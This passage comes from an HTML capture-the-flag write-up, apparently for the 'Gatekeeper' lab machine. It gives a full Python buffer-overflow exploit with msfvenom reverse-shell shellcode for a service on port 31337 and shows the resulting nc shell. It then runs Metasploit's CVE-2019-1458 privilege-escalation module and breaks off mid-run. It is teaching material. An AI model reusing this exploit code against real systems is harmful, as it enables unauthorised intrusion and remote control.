&lt;p&gt;Inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Share&lt;/code&gt;, we found a Windows executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gatekeeper.exe&lt;/code&gt;. To download the binary, we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get ...&lt;/code&gt; command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;hare&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; get gatekeeper.exe
getting file &lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;hare&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;atekeeper.exe of size 13312 as gatekeeper.exe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 5.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Further enumeration reveals the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gatekeeper.exe&lt;/code&gt; binary initialize a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gatekeeper&lt;/code&gt; service on port 31337.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;buffer-overflow&quot;&gt;&lt;strong&gt;Buffer Overflow&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Now, to exploit the BOF vulnerability, it’s worth taking note of:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Offset&lt;/strong&gt;: 146&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;JMP ESP address&lt;/strong&gt;: 080414C3&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bad characters&lt;/strong&gt;: 00, 0a&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our final exploitation script (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.py&lt;/code&gt;) might look as the following.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;10.10.113.117&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31337&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;146&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;retn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC3\x14\x04\x08&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# JMP ESP address 080414C3
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;postfix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x90\x90\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -b &quot;\x00\x0a&quot; -f py
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xda\xc1\xd9\x74\x24\xf4\x58\xbe\x6e\xee\xe6\xcc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\xae&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xea\x04\x39\xd2\x1b\x4a\xc2\x2a\xdc\x2b\x4a\xcf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xed\x6b\x28\x84\x5e\x5c\x3a\xc8\x52\x17\x6e\xf8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe1\x55\xa7\x0f\x41\xd3\x91\x3e\x52\x48\xe1\x21&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd0\x93\x36\x81\xe9\x5b\x4b\xc0\x2e\x81\xa6\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7\xcd\x15\x04\x83\x98\xa5\xaf\xdf\x0d\xae\x4c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x97\x2c\x9f\xc3\xa3\x76\x3f\xe2\x60\x03\x76\xfc&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65\x2e\xc0\x77\x5d\xc4\xd3\x51\xaf\x25\x7f\x9c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x1f\xd4\x81\xd9\x98\x07\xf4\x13\xdb\xba\x0f\xe0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa1\x60\x85\xf2\x02\xe2\x3d\xde\xb3\x27\xdb\x95&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb8\x8c\xaf\xf1\xdc\x13\x63\x8a\xd9\x98\x82\x5c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68\xda\xa0\x78\x30\xb8\xc9\xd9\x9c\x6f\xf5\x39&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f\xcf\x53\x32\x92\x04\xee\x19\xfb\xe9\xc3\xa1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xfb\x65\x53\xd2\xc9\x2a\xcf\x7c\x62\xa2\xc9\x7b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x85\x99\xae\x13\x78\x22\xcf\x3a\xbf\x76\x9f\x54&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x16\xf7\x74\xa4\x97\x22\xda\xf4\x37\x9d\x9b\xa4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf7\x4d\x74\xae\xf7\xb2\x64\xd1\xdd\xda\x0f\x28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xb6\xee\xcb\x33\x7b\x87\xd1\x33\x83\x07\x5f\xd5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe9\xb7\x09\x4e\x86\x2e\x10\x04\x37\xae\x8e\x61&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x77\x24\x3d\x96\x36\xcd\x48\x84\xaf\x3d\x07\xf6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x41\xbd\x9e\xe5\xd0\x5a\x5e\x63\xc9\xf4\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x24\x3f\x0d\xdf\xd8\x66\xa7\xfd\x20\xfe\x80\x45&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xc3\x0f\x44\x72\x7f\x34\x56\x4a\x80\x70\x02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\xd7\x2e\xfc\xe4\x81\x80\x56\xbf\x7e\x4b\x3e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x46\x4d\x4c\x38\x47\x98\x3a\xa4\xf6\x75\x7b\xdb&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x37\x12\x8b\xa4\x25\x82\x74\x7f\xee\xb2\x3e\xdd&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x47\x5b\xe7\xb4\xd5\x06\x18\x63\x19\x3f\x9b\x81&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe2\xc4\x83\xe0\xe7\x81\x03\x19\x9a\x9a\xe1\x1d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x09\x9a\x23&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;postfix&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sending evil buffer...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;latin-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Could not connect.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After everything is line up, we simply execute the script.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 exploit.py
Sending evil buffer...
Done!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;natbat&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80              
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.4.1.61] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.113.117] 49214
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7601]
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;atbat&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;whoami
&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;gatekeeper&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;atbat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;cve-2019-1458&quot;&gt;&lt;strong&gt;CVE-2019-1458&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Further gathering the target system divulges that it’s kernel is vulnnerable to &lt;strong&gt;CVE-2019-1458&lt;/strong&gt;. Let’s us utilize &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; to mount the attack.&lt;/p&gt;

&lt;p&gt;From our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; console, we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use&lt;/code&gt; the module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/local/cve_2019_1458_wizardopium&lt;/code&gt; and adjust it’s configurations&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use windows/local/cve_2019_1458_wizardopium
msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/cve_2019_1458_wizardopium&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/local/cve_2019_1458_wizardopium&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   PROCESS  notepad.exe      &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Name of process to spawn and inject dll into.
   SESSION  2                &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The session to run this module on.


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   EXITFUNC  process          &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Exit technique &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;, seh, thread, process, none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LHOST     10.0.2.15        &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT     4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Windows 7 x64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf6 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/cve_2019_1458_wizardopium&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.4.1.61:4444 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Running automatic check &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;set AutoCheck false&quot;&lt;/span&gt; to disable&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] The target appears to be vulnerable.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Launching notepad.exe to host the exploit...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Process 1448 launched.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Injecting exploit into 1448 ...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exploit injected. Injecting payload into 1448...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Payload injected. Executing exploit...
